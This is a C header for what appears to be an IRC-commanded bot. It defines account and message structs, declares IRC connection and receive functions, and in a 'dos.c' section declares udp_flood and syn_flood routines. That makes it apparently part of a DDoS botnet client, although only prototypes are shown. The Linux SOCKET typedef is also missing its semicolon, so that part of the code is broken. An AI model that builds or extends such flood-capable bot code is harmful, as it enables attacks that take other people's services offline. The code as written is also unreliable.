/*
 * Title: bot.h
 * Description: file contains miscellaneous 
 *              definitions, function definitions
 *              and structs
 *
 *
 *
 *
 *
 *
 */

/*
 * header guards to prevent
 * double includes
 */
#ifndef BOT_H
#define BOT_H

/*
 * max buffer size to send
 * or receive 
 */
#define MAX_MSG_SIZE 4096

/*
 * default size for malloc
 */
#define DEFAULT_MALLOC_SIZE 2048

/*
 * maximum irc name size
 */
#define MAX_NAME 31

#define zeroMem(x) memset((x), 0, sizeof (x));

#ifdef _WIN32
/*
 * macro for easier sleep
 * times sleep (seconds)
 */
#define sleep(x) Sleep ((x)*1000);

#elif __linux__

/*
 * a sort of hacky solution
 * to WIN32's SOCKET typedef
 * and linux's file descriptor
 */
typedef unsigned int SOCKET

#endif

/*
 * struct containing IRC
 * details of bot
 */
typedef struct _account {
	char u_name[MAX_NAME];		// username
	char n_name[MAX_NAME];		// nickname
	char *pword;			// username's password
	char *channel;			// channel/privmsg
} Account, *pAccount;

/*
 * struct to store information
 * from received messages 
 * from IRC
 */
typedef struct _message {
	char n_name[MAX_NAME];		// nickname
	char *contact;			// channel/privmsg
	int contactSize;
	char *command;			// command
	int commandSize;
	char *param;			// command [paramter]
	int paramSize;
	char *msg;			// entire message
	int msgSize;
} Message, *pMessage;

/*
 * function definitions go here
 * please make sure that only
 * functions which carry across
 * are added here, else make 
 * it static
 * also add the function
 * definitions under the 
 * respective file
 * if file comment does not
 * yet exist, please make one
 */
// bot.c
void non_fatal (char *, int);
void fatal (char *, int);

// init.c
pAccount new_account (void);
pMessage new_message (void);
SOCKET irc_connect (char *, char *);
int setup_irc (SOCKET , pAccount);
void str_to_lower (char *);

// recv.c
int cleanup (SOCKET, pAccount, pMessage);
void start_recv (SOCKET, pAccount);

// dos.c
void udp_flood (SOCKET s);
void syn_flood (SOCKET s);

#endif
